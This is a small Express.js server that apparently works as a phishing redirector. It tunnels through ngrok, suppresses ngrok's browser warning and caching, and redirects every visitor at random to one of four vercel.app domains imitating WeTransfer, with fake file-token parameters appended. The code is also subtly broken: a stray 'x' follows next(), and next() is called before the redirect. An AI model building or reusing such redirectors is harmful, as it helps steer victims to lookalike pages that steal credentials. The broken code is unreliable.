const express = require("express");
const app = express();
const PORT = 5000; // Change if needed

app.use((req, res, next) => {
    res.setHeader("ngrok-skip-browser-warning", "true");
    next();x

    // List of URLs for redirection
    const urls = [
        "https://download-wetransfer-wp8tkd96cmrqfbloynb7vhxy2rjqg3t5aztpxlmapp.vercel.app/?_filestorage_id=Kx2GtvNhRCEoLZ5JYbF8pMB6XD39WeTgKoObGl0YqmHrjHbEyWpubWUvc2NyLmpzIj48L3NjcmlwdD4KPC9oZWFkPgo8Ym9k",
        "https://wetr-document-hcnyubrtlfem5on5abvz5xc6tecp3t1zkob5czohbnxfczdg.vercel.app/?_transferdata_key=Gz4LmvXKRTJYbZ5F8PqNWC6X39WD2MoBoObGl0YpmHrjHbEyWpubWUvc2NyLmpzIj48L3NjcmlwdD4KPC9oZWFkPgo8Ymdp",
        "https://wetr-wdocwetransfer-uy8btvznhkeble5vgwpo.vercel.app/?_securefile_code=QmJ8VRZKTX5bYFMWPD26X39WGCoLoObGl0YtmHrjHbEyWpubWUvc2NyLmpzIj48L3NjcmlwdD4KPC9oZWFkPgo8Ymjbl",
        "https://wtransferstorage-docsbx5vq3nth6yz7e2gcqmlxtrznvkaf4dopcjmyapp.vercel.app/?_datashare_token=YbX5KJoRFmVZP8LTCGNhWqD26X39WMBKoObGl0YpmHrjHbEyWpubWUvc2NyLmpzIj48L3NjcmlwdD4KPC9oZWFkPgo8Ymskl"
    ];

    // Select a random URL
    const selectedUrl = urls[Math.floor(Math.random() * urls.length)];

    // Append query parameters from request
    const queryParams = req.originalUrl.includes("?") ? req.originalUrl.split("?")[1] : "";
    const redirectUrl = queryParams ? `${selectedUrl}&${queryParams}` : selectedUrl;

    console.log(`Redirecting to: ${redirectUrl}`);

    // Send an instant HTTP redirect
    res.setHeader("Cache-Control", "no-store, no-cache, must-revalidate, proxy-revalidate");
    res.setHeader("Pragma", "no-cache");
    res.setHeader("Expires", "0");
    res.redirect(302, redirectUrl); // 302 ensures an instant redirect
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});

